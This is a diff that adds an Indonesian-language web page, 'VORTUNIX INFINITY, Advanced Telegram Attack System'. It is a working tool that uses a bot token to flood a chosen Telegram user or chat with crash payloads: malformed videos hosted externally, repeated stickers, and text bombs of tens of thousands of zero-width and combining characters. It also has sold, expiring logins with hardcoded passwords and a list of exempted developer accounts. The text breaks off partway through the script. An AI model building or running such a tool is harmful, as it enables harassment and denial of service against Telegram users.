@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Website Bug Telegram - GyzenLyoraa</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+:root {
+  --primary: #ff00ff;
+  --secondary: #9d00ff;
+  --accent: #00ff88;
+  --dark: rgba(20, 20, 30, 0.8);
+  --darker: rgba(10, 10, 20, 0.9);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Segoe UI', Arial, sans-serif;
+  background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+  background-size: 400% 400%;
+  animation: gradientShift 15s ease infinite;
+  color: #fff;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+#particles-js {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  z-index: -1;
+}
+
+.container {
+  max-width: 900px;
+  margin: 20px auto;
+  padding: 30px;
+  background: var(--dark);
+  border-radius: 25px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  box-shadow: 
+    0 8px 32px rgba(0, 0, 0, 0.3),
+    inset 0 1px 0 rgba(255, 255, 255, 0.1),
+    inset 0 -1px 0 rgba(0, 0, 0, 0.2);
+  position: relative;
+  overflow: hidden;
+}
+
+.container::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, var(--primary), var(--accent), var(--secondary));
+  animation: borderGlow 3s ease-in-out infinite;
+}
+
+@keyframes borderGlow {
+  0%, 100% { opacity: 0.7; }
+  50% { opacity: 1; }
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 40px;
+  position: relative;
+}
+
+.header::after {
+  content: '';
+  position: absolute;
+  bottom: -15px;
+  left: 25%;
+  width: 50%;
+  height: 3px;
+  background: linear-gradient(90deg, transparent, var(--primary), transparent);
+  border-radius: 50%;
+}
+
+h2 {
+  font-size: 3em;
+  margin-bottom: 10px;
+  background: linear-gradient(45deg, var(--primary), var(--accent), var(--secondary));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  text-shadow: 0 0 30px rgba(157, 0, 255, 0.5);
+  animation: textGlow 2s ease-in-out infinite alternate;
+}
+
+@keyframes textGlow {
+  from { text-shadow: 0 0 20px rgba(157, 0, 255, 0.5); }
+  to { text-shadow: 0 0 30px rgba(255, 0, 255, 0.8), 0 0 40px rgba(0, 255, 136, 0.6); }
+}
+
+.subtitle {
+  color: rgba(255, 255, 255, 0.7);
+  font-size: 1.1em;
+  font-weight: 300;
+  letter-spacing: 2px;
+}
+
+.input-group {
+  margin-bottom: 25px;
+  position: relative;
+}
+
+label {
+  display: block;
+  margin-bottom: 12px;
+  font-weight: 600;
+  color: rgba(255, 255, 255, 0.9);
+  text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+  font-size: 1.1em;
+}
+
+input, select {
+  width: 100%;
+  padding: 15px 20px;
+  border: none;
+  border-radius: 15px;
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(10px);
+  color: #fff;
+  font-size: 16px;
+  transition: all 0.3s ease;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  box-shadow: 
+    inset 0 2px 4px rgba(0, 0, 0, 0.3),
+    0 4px 15px rgba(0, 0, 0, 0.2);
+}
+
+input:focus, select:focus {
+  outline: none;
+  border-color: var(--primary);
+  box-shadow: 
+    inset 0 2px 4px rgba(0, 0, 0, 0.3),
+    0 4px 20px var(--primary),
+    0 0 0 2px rgba(157, 0, 255, 0.2);
+  background: rgba(255, 255, 255, 0.15);
+}
+
+input::placeholder {
+  color: rgba(255, 255, 255, 0.5);
+}
+
+.range-input {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.range-input input[type="range"] {
+  flex: 1;
+  height: 8px;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  outline: none;
+  -webkit-appearance: none;
+}
+
+.range-input input[type="range"]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  width: 25px;
+  height: 25px;
+  border-radius: 50%;
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  cursor: pointer;
+  box-shadow: 0 0 15px var(--primary);
+  transition: all 0.3s ease;
+}
+
+.range-input input[type="range"]::-webkit-slider-thumb:hover {
+  transform: scale(1.2);
+  box-shadow: 0 0 20px var(--primary);
+}
+
+.range-value {
+  min-width: 80px;
+  text-align: center;
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  padding: 10px 15px;
+  border-radius: 12px;
+  font-weight: bold;
+  box-shadow: 0 4px 15px rgba(157, 0, 255, 0.4);
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+}
+
+.stats {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 20px;
+  margin: 30px 0;
+}
+
+.stat-card {
+  background: rgba(255, 255, 255, 0.1);
+  padding: 20px;
+  border-radius: 15px;
+  text-align: center;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+
+.stat-card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+  transition: left 0.5s ease;
+}
+
+.stat-card:hover::before {
+  left: 100%;
+}
+
+.stat-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+}
+
+.stat-value {
+  font-size: 2em;
+  font-weight: bold;
+  color: var(--accent);
+  text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+  margin-bottom: 5px;
+}
+
+.stat-label {
+  font-size: 0.9em;
+  color: rgba(255, 255, 255, 0.7);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.button-group {
+  display: flex;
+  gap: 20px;
+  margin: 30px 0;
+}
+
+.btn {
+  flex: 1;
+  padding: 18px;
+  font-weight: bold;
+  border: none;
+  border-radius: 15px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: all 0.3s ease;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  position: relative;
+  overflow: hidden;
+  backdrop-filter: blur(10px);
+}
+
+.btn::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transition: left 0.5s ease;
+}
+
+.btn:hover::before {
+  left: 100%;
+}
+
+.btn-primary {
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  color: white;
+  box-shadow: 
+    0 6px 20px rgba(157, 0, 255, 0.4),
+    inset 0 1px 0 rgba(255, 255, 255, 0.2);
+}
+
+.btn-primary:hover {
+  transform: translateY(-3px);
+  box-shadow: 
+    0 10px 30px rgba(157, 0, 255, 0.6),
+    inset 0 1px 0 rgba(255, 255, 255, 0.3);
+}
+
+.btn-secondary {
+  background: rgba(255, 255, 255, 0.1);
+  color: white;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+}
+
+.btn-secondary:hover {
+  transform: translateY(-3px);
+  background: rgba(255, 255, 255, 0.15);
+  box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+}
+
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+  transform: none !important;
+}
+
+#log {
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  padding: 20px;
+  margin-top: 25px;
+  height: 300px;
+  overflow-y: auto;
+  background: rgba(0, 0, 0, 0.3);
+  border-radius: 15px;
+  font-size: 14px;
+  font-family: 'Courier New', monospace;
+  backdrop-filter: blur(10px);
+  box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.3);
+}
+
+.log-entry {
+  padding: 12px 0;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  animation: slideIn 0.3s ease;
+  position: relative;
+}
+
+.log-entry::before {
+  content: '›';
+  position: absolute;
+  left: -15px;
+  color: var(--accent);
+}
+
+@keyframes slideIn {
+  from { 
+    opacity: 0;
+    transform: translateX(-20px);
+  }
+  to { 
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+.success { color: var(--accent); text-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
+.error { color: #ff4444; text-shadow: 0 0 10px rgba(255, 68, 68, 0.3); }
+.warning { color: #ffaa00; text-shadow: 0 0 10px rgba(255, 170, 0, 0.3); }
+.info { color: #66ccff; text-shadow: 0 0 10px rgba(102, 204, 255, 0.3); }
+
+.progress-container {
+  margin: 25px 0;
+}
+
+.progress-bar {
+  width: 100%;
+  height: 8px;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.3);
+}
+
+.progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--primary), var(--accent), var(--secondary));
+    border-radius: 10px;
+    transition: width 0.4s ease;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 0 10px rgba(157, 0, 255, 0.5);
+}
+
+.progress-fill::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
+    animation: shimmer 1.5s infinite;
+}
+
+@keyframes shimmer {
+  0% { left: -100%; }
+  100% { left: 100%; }
+}
+
+.mode-description {
+  background: rgba(157, 0, 255, 0.1);
+  padding: 15px;
+  border-radius: 12px;
+  margin-top: 10px;
+  font-size: 0.9em;
+  color: rgba(255, 255, 255, 0.8);
+  border-left: 3px solid var(--primary);
+  backdrop-filter: blur(5px);
+}
+
+.quick-actions {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 15px;
+  margin: 20px 0;
+}
+
+.quick-btn {
+  padding: 12px;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  color: rgba(255, 255, 255, 0.8);
+  cursor: pointer;
+  transition: all 0.3s ease;
+  font-size: 0.85em;
+  backdrop-filter: blur(5px);
+}
+
+.quick-btn:hover {
+  background: rgba(157, 0, 255, 0.2);
+  border-color: var(--primary);
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(157, 0, 255, 0.3);
+}
+
+.footer {
+  margin-top: 30px;
+  padding-top: 20px;
+  border-top: 1px solid rgba(255, 255, 255, 0.1);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.dev-buttons {
+  display: flex;
+  gap: 12px;
+}
+
+.dev-btn {
+  padding: 10px 18px;
+  background: rgba(157, 0, 255, 0.2);
+  border: 1px solid var(--primary);
+  border-radius: 10px;
+  color: rgba(255, 255, 255, 0.9);
+  text-decoration: none;
+  font-size: 0.85em;
+  transition: all 0.3s ease;
+  backdrop-filter: blur(5px);
+}
+
+.dev-btn:hover {
+  background: rgba(157, 0, 255, 0.4);
+  transform: translateY(-2px);
+  box-shadow: 0 5px 15px rgba(157, 0, 255, 0.4);
+}
+
+.user-info {
+  font-size: 0.8em;
+  color: rgba(255, 255, 255, 0.6);
+}
+
+.floating-particle {
+  position: absolute;
+  width: 4px;
+  height: 4px;
+  background: var(--accent);
+  border-radius: 50%;
+  pointer-events: none;
+  animation: float 6s ease-in-out infinite;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0) rotate(0deg); }
+  50% { transform: translateY(-20px) rotate(180deg); }
+}
+
+@media (max-width: 768px) {
+  .container {
+    margin: 10px;
+    padding: 20px;
+  }
+  
+  h2 {
+    font-size: 2em;
+  }
+  
+  .stats {
+    grid-template-columns: 1fr;
+    gap: 15px;
+  }
+  
+  .button-group {
+    flex-direction: column;
+  }
+  
+  .quick-actions {
+    grid-template-columns: 1fr;
+  }
+  
+  .footer {
+    flex-direction: column;
+    gap: 15px;
+    text-align: center;
+  }
+}
+
+.login-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.9);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+  backdrop-filter: blur(10px);
+}
+
+.login-content {
+  background: var(--dark);
+  padding: 40px;
+  border-radius: 20px;
+  border: 2px solid var(--primary);
+  max-width: 400px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 0 50px rgba(157, 0, 255, 0.5);
+}
+
+.login-input {
+  width: 100%;
+  padding: 15px;
+  margin: 20px 0;
+  border-radius: 12px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  background: rgba(255, 255, 255, 0.1);
+  color: white;
+  font-size: 16px;
+  text-align: center;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 15px;
+  background: linear-gradient(45deg, var(--primary), var(--secondary));
+  border: none;
+  border-radius: 12px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 16px;
+  transition: all 0.3s ease;
+}
+
+.login-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 5px 20px rgba(157, 0, 255, 0.6);
+}
+
+.login-footer {
+  margin-top: 20px;
+  color: rgba(255, 255, 255, 0.6);
+  font-size: 0.9em;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.fas {
+  margin-right: 8px;
+}
+
+h3 {
+  font-size: 1.8em;
+  margin-bottom: 15px;
+  background: linear-gradient(45deg, var(--primary), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+</style>
+</head>
+<body>
+<div id="particles-js"></div>
+
+<div id="loginModal" class="login-modal">
+  <div class="login-content">
+    <h3><i class="fas fa-lock"></i> Login Required</h3>
+    <p>Masukkan username dan password untuk melanjutkan</p>
+    <input type="text" id="loginUsername" class="login-input" placeholder="Username...">
+    <input type="password" id="loginPassword" class="login-input" placeholder="Password...">
+    <button onclick="checkLogin()" class="login-btn"><i class="fas fa-rocket"></i> Login</button>
+    <div class="login-footer">
+      <p>Hubungi developer untuk mendapatkan akses</p>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="header">
+    <h2><i class="fas fa-bolt"></i> VORTUNIX INFINITY</h2>
+    <div class="subtitle">Advanced Telegram Attack System</div>
+  </div>
+
+  <div class="input-group">
+    <label><i class="fas fa-robot"></i> Token Bot:</label>
+    <input type="text" id="tokenInput" placeholder="Masukkan token bot Telegram...">
+  </div>
+
+  <div class="input-group">
+    <label><i class="fas fa-bullseye"></i> Target (Chat ID/Username):</label>
+    <input type="text" id="chatId" placeholder="Contoh: 123456789 atau @username">
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="stat-value" id="sentCount">0</div>
+      <div class="stat-label">Terkirim</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="successCount">0</div>
+      <div class="stat-label">Berhasil</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="errorCount">0</div>
+      <div class="stat-label">Gagal</div>
+    </div>
+  </div>
+
+  <div class="input-group">
+    <label><i class="fas fa-hashtag"></i> Jumlah Pesan:</label>
+    <div class="range-input">
+      <input type="range" id="countRange" min="1" max="100" value="10">
+      <input type="number" id="count" min="1" max="1000" value="10" class="range-value">
+    </div>
+  </div>
+
+  <div class="input-group">
+    <label><i class="fas fa-clock"></i> Delay (ms):</label>
+    <div class="range-input">
+      <input type="range" id="delayRange" min="100" max="5000" step="100" value="1000">
+      <input type="number" id="delay" min="100" max="10000" value="1000" class="range-value">
+    </div>
+  </div>
+
+  <div class="input-group">
+    <label><i class="fas fa-gamepad"></i> Mode Serangan:</label>
+    <select id="mode">
+      <option value="video">Crash Video</option>
+      <option value="sticker">Crash Sticker</option>
+      <option value="text">Crash Text</option>
+      <option value="combo">Vtx Meta Combo</option>
+    </select>
+    
+    <div class="mode-description" id="modeDesc">
+      Pilih mode serangan yang diinginkan
+    </div>
+  </div>
+
+  <div class="quick-actions">
+    <button class="quick-btn" onclick="setQuickSettings(5, 500)"><i class="fas fa-rocket"></i> Fast (5 msg, 500ms)</button>
+    <button class="quick-btn" onclick="setQuickSettings(20, 1000)"><i class="fas fa-bolt"></i> Medium (20 msg, 1s)</button>
+    <button class="quick-btn" onclick="setQuickSettings(50, 2000)"><i class="fas fa-skull"></i> Heavy (50 msg, 2s)</button>
+    <button class="quick-btn" onclick="setQuickSettings(100, 3000)"><i class="fas fa-radiation"></i> Extreme (100 msg, 3s)</button>
+  </div>
+
+  <div class="progress-container">
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+  </div>
+
+  <div class="button-group">
+    <button class="btn btn-primary" onclick="toggleAttack()" id="attackBtn">
+      <i class="fas fa-fire"></i> Mulai Vortunix Attack
+    </button>
+    <button class="btn btn-secondary" onclick="clearLog()">
+      <i class="fas fa-trash"></i> Clear Log
+    </button>
+  </div>
+
+  <div id="log"></div>
+
+  <div class="footer">
+    <div class="dev-buttons">
+      <a href="https://t.me/GyzenVtx" class="dev-btn" target="_blank"><i class="fas fa-user"></i> Developer</a>
+      <a href="https://t.me/AboutGyzenLyoraa" class="dev-btn" target="_blank"><i class="fas fa-broadcast-tower"></i> Channel</a>
+      <button class="dev-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+    </div>
+    <div class="user-info" id="userInfo">
+      Status: <span id="loginStatus">Checking...</span>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+// ===============================
+// KONFIGURASI DAN VARIABEL GLOBAL
+// ===============================
+
+// Konfigurasi GitHub
+const GH_USER = "GyzenLyoraa";
+const GH_REPO = "METADB"; 
+const GH_BRANCH = "main";
+const GH_FILE = "main/app.json";
+
+// User lokal (fallback)
+const LOCAL_USERS = [
+  {
+    username: "Gyzen",
+    password: "Vtx", 
+    expiresAt: 1762812924224,
+    createdAt: 1760220924224
+  },
+  {
+    username: "Vortunix",
+    password: "Infinity",
+    expiresAt: 9999999999999, 
+    createdAt: 1760220924224
+  },
+  {
+    username: "@AboutGyzenLyoraa",
+    password: "@GyzenVtx",
+    expiresAt: 1762812924224,
+    createdAt: 1760220924224
+  }
+];
+
+// Protected users and IDs - tidak boleh diattack
+const PROTECTED_USERS = [
+    "@GyzenVtx", 
+    "Vortunix",
+    "7774881838",
+    "@Gyzen",
+    "Vtx"
+];
+
+// Variabel global
+let botToken = "";
+let isRunning = false;
+let stats = {
+    sent: 0,
+    success: 0,
+    error: 0
+};
+
+// Data untuk attack
+const videoUrl = "https://files.catbox.moe/ddrcxp.mp4";
+const videoCaption = "?⏤͟͟͞͞𝙂𝙮𝙯𝙚𝙣𝙇𝙮𝙤𝙧𝙖𝙖 𝙄𝙨 Here⃠🩸 ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈˈ⃝ˈ⃝ˈ⃝ˈ⃝ˈ⃝愛 || ⏤‌FAHREZI META";
+const stickerId = "CAACAgIAAxkBAAE63u5owUCOJ51XWrMvDAmfvFQUG8okXgACX24AAkFimEhskOf27E7QezYE";
+
+// Koleksi video crash yang powerful
+const crashVideos = {
+    corruptMeta: "https://files.catbox.moe/ddrcxp.mp4",
+    longDuration: "https://files.catbox.moe/89t0ah.jpg",
+    unusualCodec: "https://files.catbox.moe/qhrfuz.jpg",
+    extremeRes: "https://files.catbox.moe/si9eel.png",
+    highFPS: "https://files.catbox.moe/gbinbs.jpg",
+    audioBomb: "https://files.catbox.moe/d1f8bc.mp4"
+};
+
+// Caption crash yang powerful
+const crashCaptions = [
+    "V҉O҉R҉T҉U҉N҉I҉X҉V҉I҉D҉E҉O҉ C҉R҉A҉S҉H҉\nC҉R҉A҉S҉H҉I҉N҉G҉ S҉Y҉S҉T҉E҉M҉\nV҉I҉D҉E҉O҉ O҉V҉E҉R҉L҉O҉A҉D҉ A҉C҉T҉I҉V҉A҉T҉E҉D҉",
+
+    "\u200B".repeat(99999) + "VORTUNIX VIDEO CRASH" + "\u200C".repeat(999) + "\nINVISIBLE TEXT BOMB ACTIVATED\nVORTUNIX WIDTH JOINER ATTACK"
+];
+
+// Koleksi sticker crash yang powerful
+const crashStickers = [
+    "CAACAgIAAxkBAAE63u5owUCOJ51XWrMvDAmfvFQUG8okXgACX24AAkFimEhskOf27E7QezYE",
+    "CAACAgIAAxkBAAE7GO5o4JqAAAEB1XvWXc0X_2CbX5jQbNYAAmFuAAJBYphIbJDn9uxO0Hs0BA",
+    "CAACAgIAAxkBAAE7GPJo4J3j7gABAUX1yf9Jq8v_8n-S6AACZG4AAkFimEhskOf27E7QezYE"
+];
+
+// Mode descriptions
+const modeDescriptions = {
+    video: "Mengirim video dengan caption khusus untuk crash target",
+    sticker: "Mengirim stiker beruntun untuk overload client", 
+    text: "Mengirim teks panjang dengan karakter khusus",
+    combo: "Kombinasi semua mode attack secara berurutan"
+};
+
+// ===============================
+// SISTEM AUTHENTIKASI
+// ===============================
+
+class AuthSystem {
+  constructor() {
+    this.isLoggedIn = false;
+    this.currentUser = null;
+    this.users = new Map();
+    console.log('🔧 AuthSystem initialized');
+  }
+
+  async initialize() {
+    try {
+        const savedSession = localStorage.getItem('metazi_session');
+        if (savedSession) {
+            const session = JSON.parse(savedSession);
+            if (session.expiry > Date.now() && await this.validateUser(session.username, session.password)) {
+                this.isLoggedIn = true;
+                this.currentUser = session.username;
+                this.hideLoginModal();
+                this.updateUserInfo();
+                console.log('✅ Auto-login from session');
+                return;
+            } else {
+                localStorage.removeItem('metazi_session');
+            }
+        }
+        
+        await this.loadUsersFromGitHub();
+        this.showLoginModal();
+        console.log('🔐 Login modal shown');
+        
+    } catch (error) {
+        console.error('Init error:', error);
+        this.loadLocalUsers();
+        this.showLoginModal();
+    }
+  }
+
+  loadLocalUsers() {
+    LOCAL_USERS.forEach(user => {
+        this.users.set(user.username, {
+            password: user.password,
+            expiresAt: user.expiresAt,
+            createdAt: user.createdAt
+        });
+    });
+    console.log('✅ Loaded local users:', LOCAL_USERS.map(u => u.username));
+  }
+
+  async loadUsersFromGitHub() {
+    try {
+        const rawUrl = `https://raw.githubusercontent.com/${GH_USER}/${GH_REPO}/${GH_BRANCH}/${GH_FILE}`;
+        
+        console.log('🔄 Loading users from GitHub Raw...');
+        
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        
+        const response = await fetch(rawUrl, {
+            method: 'GET',
+            signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+
+        const data = await response.json();
+        if (data.users && Array.isArray(data.users)) {
+            this.users.clear();
+            data.users.forEach(user => {
+                this.users.set(user.username, {
+                    password: user.password,
+                    expiresAt: user.expiresAt,
+                    createdAt: user.createdAt
+                });
+            });
+            console.log('✅ Users loaded from GitHub:', data.users.length);
+            return true;
+        } else {
+            throw new Error('Invalid data format');
+        }
+        
+    } catch (error) {
+        console.log('❌ GitHub Raw failed:', error.message);
+        console.log('🔄 Using local users');
+        this.loadLocalUsers();
+        return false;
+    }
+  }
+
+  async validateUser(username, password) {
+    try {
+        const user = this.users.get(username);
+        if (user) {
+            if (user.password === password) {
+                if (user.expiresAt && Date.now() > user.expiresAt) {
+                    this.showMessage('❌ Akun sudah expired!', 'error');
+                    return false;
+                }
+                return true;
+            }
+            return false;
+        }
+
+        const fallbackUser = LOCAL_USERS.find(u => u.username === username && u.password === password);
+        if (fallbackUser) {
+            if (fallbackUser.expiresAt && Date.now() > fallbackUser.expiresAt) {
+                this.showMessage('❌ Akun sudah expired!', 'error');
+                return false;
+            }
+            return true;
+        }
+
+        return false;
+    } catch (error) {
+        console.error('Validation error:', error);
+        return false;
+    }
+  }
+
+  async login(username, password) {
+    try {
+        if (!username || !password) {
+            this.showMessage('❌ Masukkan username dan password!', 'error');
+            return false;
+        }
+
+        const isValid = await this.validateUser(username, password);
+        if (isValid) {
+            this.isLoggedIn = true;
+            this.currentUser = username;
+            
+            const session = {
+                username: username,
+                expiry: Date.now() + (24 * 60 * 60 * 1000)
+            };
+            localStorage.setItem('metazi_session', JSON.stringify(session));
+            
+            this.hideLoginModal();
+            this.updateUserInfo();
+            this.showMessage(`✅ Login berhasil! Selamat datang ${username}`, 'success');
+            return true;
+        } else {
+            this.showMessage('❌ Username atau password salah!', 'error');
+            return false;
+        }
+    } catch (error) {
+        console.error('Login error:', error);
+        this.showMessage('❌ System error during login', 'error');
+        return false;
+    }
+  }
+
+  logout() {
+    this.isLoggedIn = false;
+    this.currentUser = null;
+    localStorage.removeItem('metazi_session');
+    this.showLoginModal();
+    this.updateUserInfo();
+    this.showMessage('🔒 Logged out', 'warning');
+  }
+
+  showLoginModal() {
+    document.getElementById('loginModal').classList.remove('hidden');
+    this.updateUserInfo();
+  }
+
+  hideLoginModal() {
+    document.getElementById('loginModal').classList.add('hidden');
+    this.updateUserInfo();
+  }
+
+  updateUserInfo() {
+    const userInfo = document.getElementById('userInfo');
+    const loginStatus = document.getElementById('loginStatus');
+    
+    if (this.isLoggedIn && this.currentUser) {
+      const userData = this.users.get(this.currentUser) || 
+                      LOCAL_USERS.find(u => u.username === this.currentUser);
+      
+      let statusText = `Logged in as: ${this.currentUser}`;
+      
+      if (userData && userData.expiresAt) {
+        const expiresDate = new Date(userData.expiresAt);
+        const daysLeft = Math.ceil((userData.expiresAt - Date.now()) / (1000 * 60 * 60 * 24));
+        
+        if (daysLeft > 0) {
+          statusText += ` | Expires: ${daysLeft} day(s) left`;
+        } else {
+          statusText += ` | EXPIRED`;
+        }
+      }
+      
+      loginStatus.textContent = statusText;
+      userInfo.style.color = 'var(--accent)';
+    } else {
+      loginStatus.textContent = 'Not Logged In';
+      userInfo.style.color = '#ff4444';
+    }
+  }
+
+  showMessage(message, type) {
+    logMessage(message, type);
+  }
+
+  checkAuth() {
+    if (!this.isLoggedIn) {
+      this.showMessage('❌ Silakan login terlebih dahulu!', 'error');
+      this.showLoginModal();
+      return false;
+    }
+    return true;
+  }
+}
+
+const authSystem = new AuthSystem();
+
+// ===============================
+// FUNGSI UTILITAS
+// ===============================
+
+function delay(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+function logMessage(msg, type = 'info') {
+  const log = document.getElementById('log');
+  const entry = document.createElement('div');
+  entry.className = `log-entry ${type}`;
+  entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  log.appendChild(entry);
+  log.scrollTop = log.scrollHeight;
+}
+
+function updateStats(type = 'sent') {
+    stats[type]++;
+    
+    document.getElementById('sentCount').textContent = stats.sent;
+    document.getElementById('successCount').textContent = stats.success;
+    document.getElementById('errorCount').textContent = stats.error;
+    
+    const total = parseInt(document.getElementById('count').value);
+    if (total > 0) {
+        const progress = (stats.sent / total) * 100;
+        document.getElementById('progressFill').style.width = `${Math.min(progress, 100)}%`;
+    }
+}
+
+function updateProgress(current, total) {
+  const progress = (current / total) * 100;
+  document.getElementById('progressFill').style.width = `${progress}%`;
+}
+
+function isProtectedTarget(target) {
+    const normalizedTarget = target.toString().toLowerCase().trim();
+    
+    return PROTECTED_USERS.some(protected => {
+        const normalizedProtected = protected.toString().toLowerCase().trim();
+        return normalizedTarget === normalizedProtected;
+    });
+}
+
+function validateTarget(target) {
+    if (isProtectedTarget(target)) {
+        logMessage(`❌ DILARANG MENYERANG DEVELOPER/TARGET TERLINDUNG!`, 'error');
+        logMessage(`❌ Target ${target} berada dalam daftar proteksi`, 'error');
+        logMessage(`❌ Hubungi @GyzenVtx untuk info lebih lanjut`, 'error');
+        return false;
+    }
+    return true;
+}
+
+// ===============================
+// FUNGSI BUG ATTACK ASLI
+// ===============================
+
+// Karakter khusus untuk efek extreme
+const extremeChars = {
+    zeroWidth: ["\u200B", "\u200C", "\u200D", "\u2060", "\u2061", "\u2062", "\u2063", "\u2064"],
+    combining: Array.from({length: 112}, (_, i) => String.fromCharCode(0x0300 + i)),
+    math: ["∑", "∏", "∐", "∫", "∬", "∭", "∮", "∯", "∰", "∱", "∲", "∳", "∀", "∁", "∂", "∃", "∄", "∅", "∆", "∇"],
+    shapes: ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▉", "▊", "▋", "▌", "▍", "▎", "▏", "▐", "░", "▒", "▓", "▔", "▕", "▖", "▗", "▘", "▙", "▚", "▛", "▜", "▝", "▞", "▟"],
+    arrows: ["←", "↑", "→", "↓", "↔", "↕", "↖", "↗", "↘", "↙", "↚", "↛", "↜", "↝", "↞", "↟", "↠", "↡", "↢", "↣", "↤", "↥", "↦", "↧", "↨", "↩", "↪", "↫", "↬", "↭", "↮", "↯", "↰", "↱", "↲", "↳", "↴", "↵", "↶", "↷", "↸", "↹", "↺", "↻"],
+    music: ["♪", "♫", "♬", "♭", "♮", "♯", "🎵", "🎶", "🎷", "🎸", "🎹", "🎺", "🎻", "🥁"],
